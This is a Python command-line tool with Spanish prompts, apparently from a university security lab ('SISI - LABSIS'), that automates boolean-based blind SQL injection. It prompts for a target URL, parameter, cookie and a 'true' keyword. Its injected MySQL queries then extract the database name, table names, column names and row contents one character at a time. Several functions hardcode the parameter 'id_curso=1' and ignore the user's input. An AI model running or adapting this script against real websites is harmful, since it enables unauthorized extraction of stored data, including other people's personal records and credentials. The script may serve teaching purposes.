import requests
import sys

print ("BLIND SQL INJECTION - SISI - LABSIS")
print("------------------------------------")
print()
print("Inserte la url a atacar: ")
url = input()  
print("Inserte parámetro a vulnerar con un valor existente. (parámetro=valor): ")
parametro = input()
print("Si es necesario, inserte la cookie de la forma cookie=valor. En caso contrario, no ingrese datos: ")
cookies = input() 
if cookies:
    cookies = {cookies.split("=")[0]: cookies.split("=")[1]}
else:
    cookies = {}
print("Palabra clave de identificación de contenido: ")
keyword = input()
charset = 'abcdefghijklmnñopqrstuvwxyz0123456789_-ABCDEFGHIJKLMNÑOPQRSTUVWXYZ'
nombre_bd = ""

opcion_menu = 0


def obtener_nombre_bd():
    #    Obtenemos largo de la base de datos
    length = 0
    for i in range(1, 100):    
        injection = "?"+str(parametro)+" AND (SELECT LENGTH(database()))=" + str(i) 
        content = requests.get(str(url + injection), cookies=cookies).content
        if str(keyword) in str(content):
            length = i
            break



    #   Obtenemos nombre de la base de datos
    database = ''
    for n in range(1, length + 1):
        for c in charset:
            injection = "?"+str(parametro)+" AND (SELECT SUBSTRING(database(), " + str(n) + ", 1))='" + c + "'%23"            
            content = requests.get(url + injection, cookies=cookies).content
            
            if (str(keyword) in str(content)):
		        
                database += c
                break

    return database


def obtener_cantidad_tablas_bd():
    cantidad = 0
    for i in range(1, 100):
    
        injection = "?"+str(parametro)+" AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='"+ str(nombre_bd) +"')=" + str(i) 
        content = requests.get(str(url + injection), cookies=cookies).content

        if str(keyword) in str(content):
            cantidad = i
            break
    return cantidad

def obtener_tablas():
    
    tablas = []
    for numero_tabla in range(0, cantidad_tablas):
        
        # Obtenemos el largo de la tabla "numero_tabla"
        tabla_largo = 0
        tabla_nombre = ""
        for i in range(1, 100):

            injection = "?"+str(parametro)+" AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema='" + str(nombre_bd) + "' LIMIT " + str(numero_tabla) + ", 1)=" + str(i) +"#"
            content = requests.get(url + injection, cookies=cookies).content

            if (str(keyword) in str(content)):
                tabla_largo = i
                break

        for n in range(1, tabla_largo + 1):
            for c in charset:
                injection = "?"+str(parametro)+" AND (SELECT table_name FROM information_schema.tables WHERE table_schema='" + str(nombre_bd) +"' LIMIT " + str(numero_tabla) + ",1) LIKE '" + str(tabla_nombre + c) + "%'#"
                content = requests.get(url + injection, cookies=cookies).content

                if (str(keyword) in str(content)):
		        
                    tabla_nombre += c
                    break


        print("Tabla número " + str(numero_tabla+1) + " - Nombre: " + str(tabla_nombre))
        tablas.append(tabla_nombre)
  
def obtener_columnas(tabla_nombre):
    cantidad_columnas = 0    
    columnas = []    

    for i in range(1, 100):
        
        injection = "?id_curso=1 AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='"+ nombre_bd +"' AND table_name='"+ str(tabla_nombre) +"')="+ str(i) +"#"

        content = requests.get(str(url + injection), cookies=cookies).content

        if str(keyword) in str(content):
              
            cantidad_columnas = i
            break

    print("Número de columnas: " + str(cantidad_columnas))
    
    

    for n in range(0, cantidad_columnas ):

        # Columna número n

        # Obtenemos el largo
        largo_columna = 0
        for i in range(1, 100):
            
            injection = "?id_curso=1 AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema='" + str(nombre_bd) + "' AND table_name='"+ str(tabla_nombre) +"' LIMIT " + str(n) + ",1)= " + str(i) + "#"

            content = requests.get(str(url + injection), cookies=cookies).content
     

            if str(keyword) in str(content):
                largo_columna = i

                break

            
        nombre_columna = ''

        for num_caracter in range(1, largo_columna + 1):
            for c in charset:
                injection = "?id_curso=1 AND (SELECT column_name FROM information_schema.columns WHERE table_schema='" + str(nombre_bd) + "' AND table_name='"+ tabla_nombre +"' LIMIT "+str(n)+",1) LIKE '"+ str(nombre_columna+c) +"%'#"

                content = requests.get(url + injection, cookies=cookies).content

                if (str(keyword) in str(content)):
	            
                    nombre_columna += c
                    break
        print(nombre_columna)
        columnas.append(nombre_columna)  
    return columnas        

def obtener_registros(tabla_nombre, columnas, cantidad):    
    
    seguir = True
    for fila in range(0, int(cantidad)):
        if not seguir:
            break;
        print()
        print("-----------")
        print("Analizando fila " + str(fila))
        for columna in columnas:

            # Obtenemos el largo
            largo_dato = 0
            for i in range(1, 100):
                
                injection = "?id_curso=1 AND (SELECT LENGTH(" + columna + ") FROM " + tabla_nombre + " LIMIT "+ str(fila) +",1)= " + str(i) + "#"


                content = requests.get(str(url + injection), cookies=cookies).content
                if str(keyword) in str(content):
                    largo_dato = i

                    break
            

            dato = ""

            for n in range(1, largo_dato +1):
                for c in charset:

                    injection = "?id_curso=1 AND (SELECT count(" + str(columna) + ") FROM (SELECT * FROM " + str(tabla_nombre) + " LIMIT "+str(fila)+",1)a WHERE " + str(columna) + " LIKE '" + str(dato + c) + "%' )>0#"

                    content = requests.get(str(url + injection), cookies=cookies).content
    #                print(injection)            
    #                print(dato)
                    if str(keyword) in str(content):
                        
                        dato += str(c)

                        break
            
            if dato == "":
                print("Ya no hay datos")
                seguir = False
                break;

            print(columna + ": " + dato)       



def obtener_informacion_tabla(tabla_nombre, cantidad):
    columnas = obtener_columnas(tabla_nombre)
    obtener_registros(tabla_nombre, columnas, cantidad)
    
  


# Menú
while(opcion_menu != 'q'):
    
    print("1 - Obtener nombre de la base de datos")
    print("2 - Obtener tablas de la base de datos")
    print("3 - Obtener columnas y valores de una tabla")
    print("q - Salir")
    print()
    print("Inserte su opción")
    opcion_menu = input()

    if (opcion_menu == '1'):
        nombre_bd = obtener_nombre_bd()
        print("Nombre de la base de datos: " + str(nombre_bd))
        print()
    

    elif (opcion_menu == '2'):
        if (nombre_bd):
            cantidad_tablas = obtener_cantidad_tablas_bd()
            print("Cantidad de tablas: " + str(cantidad_tablas))
            obtener_tablas()
            print()
        else:
            print("Debe obtener primero el nombre de la base de datos[opcion 1]")
            print()
    elif (opcion_menu == '3'):
        print("Ingrese el nombre de la tabla: ")
        tabla = input()
        print("Ingrese la cantidad de registros que quiera saber: ")
        cantidad_registros = input()
        obtener_informacion_tabla(tabla, cantidad_registros)
        print()
        

